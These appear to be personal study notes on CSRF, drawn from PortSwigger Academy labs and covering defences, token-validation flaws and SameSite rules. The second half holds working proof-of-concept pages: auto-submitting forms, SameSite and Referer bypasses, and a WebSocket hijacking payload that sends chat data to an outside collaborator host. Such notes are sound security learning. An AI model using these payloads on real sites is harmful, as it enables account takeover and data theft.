- A relevant action
- Cookie-based session handling
- No unpredictable request parameters
- Although CSRF is normally described in relation to cookie-based session handling, it also arises in other contexts where the application automatically adds some user credentials to requests, such as HTTP Basic authentication and certificate-based authentication
Method
- The attacker's page will trigger an HTTP request to the vulnerable website.
- If the user is logged in to the vulnerable website, their browser will automatically include their session cookie in the request (assuming SameSite cookies are not being used).
- The vulnerable website will process the request in the normal way, treat it as having been made by the victim user, and change their email address.
In burpsuit
- Engagement tools / Generate CSRF PoC
- GET method, then a self-contained attack
  - `<img src="https://vulnerable-website.com/email/change?email=pwned@evil-user.net">`
Defenses
- **CSRF tokens**
  - unique, secret, and unpredictable value that is generated by the server-side application and shared with the client. A common way to share CSRF tokens with the client is to include them as a hidden parameter in an HTML form.
- **SameSite cookies**
  - browser security mechanism that determines when a website's cookies are included in requests originating from other websites. Chrome enforces `Lax` SameSite restrictions by default
- **Referrer-based validation**
Vulns
- Some applications correctly validate the token when the request uses the POST method but skip the validation when the GET method is used.
- Some applications correctly validate the token when it is present but skip the validation if the token is omitted
- Some applications do not validate that the token belongs to the same session as the user who is making the request. Instead, the application maintains a global pool of tokens that it has issued and accepts any token that appears in this pool.
- some applications do tie the CSRF token to a cookie, but not to the same cookie that is used to track sessions. This can easily occur when an application employs two different frameworks, one for session handling and one for CSRF protection, which are not integrated together
- token is tied to non-session cookie
- token is simply duplicated in a cookie
  - the attacker can again perform a CSRF attack if the website contains any cookie setting functionality. Here, the attacker doesn't need to obtain a valid token of their own. They simply invent a token (perhaps in the required format, if that is being checked), leverage the cookie-setting behavior to place their cookie into the victim's browser, and feed their token to the victim in their CSRF attack.
- SameSite
  - ![[Pasted image 20251107180812.png]]
  - ![[site-vs-origin.png]]
  - a site encompasses multiple domain names, whereas an origin only includes one
  - a cross-origin request can still be same-site, but not the other way around
  - ![[Pasted image 20251107181028.png]]
  - `Strict`
    - `Set-Cookie: session=0F8tgdOhi9ynR1M9wa3ODa; SameSite=Strict`
  - `Lax`
    - The request uses the `GET` method.
    - The request resulted from a top-level navigation by the user, such as clicking on a link.
  - `None`
    - When setting a cookie with `SameSite=None`, the website must also include the `Secure` attribute, which ensures that the cookie is only sent in encrypted messages over HTTPS. Otherwise, browsers will reject the cookie and it won't be set.
    - `Set-Cookie: trackingId=0F8tgdOhi9ynR1M9wa3ODa; SameSite=None; Secure`
##### Bypassing SameSite Lax restrictions
- using GET requests
  - Even if an ordinary `GET` request isn't allowed, some frameworks provide ways of overriding the method specified in the request line. For example, Symfony supports the `_method` parameter in forms, which takes precedence over the normal method for routing purposes
    `<form action="https://vulnerable-website.com/account/transfer-payment" method="POST"> <input type="hidden" name="_method" value="GET"> <input type="hidden" name="recipient" value="hacker"> <input type="hidden" name="amount" value="1000000"> </form>
- using on-site gadgets client-side redirects
```
  - <html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0aac00b60379f3de836bb98f005b00b0.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="wiener&#64;weird&#46;net" />
      <input type="hidden" name="submit" value="1" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
        document.location = "https://0aac00b60379f3de836bb98f005b00b0.web-security-academy.net/post/comment/confirmation?postId=1/../../my-account/change-email?email=hacked@evil.net%26submit=1";
    </script>
  </body>
</html>

```
- In addition to classic CSRF, don't forget that if the target website supports WebSockets, this functionality might be vulnerable to cross-site WebSocket hijacking (CSWSH), which is essentially just a CSRF attack targeting a WebSocket handshake
- WebSocket connection lacks proper Origin header validation or CSRF protections
  - Cross-Site WebSocket Hijacking (CSWSH)
```
  - <script>
    document.location = "https://cms-0aa900d9043da57780590d18001100d7.web-security-academy.net/login?username=%3Cscript%3Evar%20ws%20%3D%20new%20WebSocket%28%27wss%3A%2F%2F0aa900d9043da57780590d18001100d7.web-security-academy.net%2Fchat%27%29%3B%20ws.onopen%20%3D%20function%28%29%20%7B%20ws.send%28%22READY%22%29%3B%20%7D%3B%20ws.onmessage%20%3D%20function%28event%29%20%7B%20fetch%28%27https%3A%2F%2Feasjtqnyoc3q2mim58guhzfef5lw9rxg.oastify.com%27%2C%20%7Bmethod%3A%20%27POST%27%2C%20mode%3A%20%27no-cors%27%2C%20body%3A%20event.data%7D%29%3B%20%7D%3B%3C%2Fscript%3E&password=anything";
    </script>
```
- Bypass referrer header
```
  - <!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8" />
    <meta name="referrer" content="no-referrer" />
    <title>CSRF PoC</title>
  </head>
  <body>
    <form
      action="https://0a22007404c7d32d81c4b725009f00fa.web-security-academy.net/my-account/change-email"
      method="POST"
      referrerpolicy="no-referrer"
    >
      <input type="hidden" name="email" value="wiener@weird.net" />
      <input type="submit" value="Submit request" />
    </form>

    <script>
      // Auto-submit after DOM is parsed
      document.addEventListener('DOMContentLoaded', function () {
        document.forms[0].submit();
      });
    </script>
  </body>
</html>

```
- Broken Referer validation
```
  - <!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8" />
    <meta name="referrer" content="unsafe-url" />
    <title>CSRF PoC</title>
  </head>
  <body>
    <form
      action="https://0aa100d4032a7c62801e30d9006300a9.web-security-academy.net/my-account/change-email"
      method="POST"
      referrerpolicy="unsafe-url"
    >
      <input type="hidden" name="email" value="wiener@weird.net" />
      <input type="submit" value="Submit request" />
    </form>

    <script>
      // Run after DOM is ready so elements exist and meta is parsed
      document.addEventListener('DOMContentLoaded', function () {
        // Update the visible address bar without reloading
        history.pushState('', '', '/?0aa100d4032a7c62801e30d9006300a9.web-security-academy.net');

        // Submit the form programmatically
        document.forms[0].submit();
      });
    </script>
  </body>
</html>

```
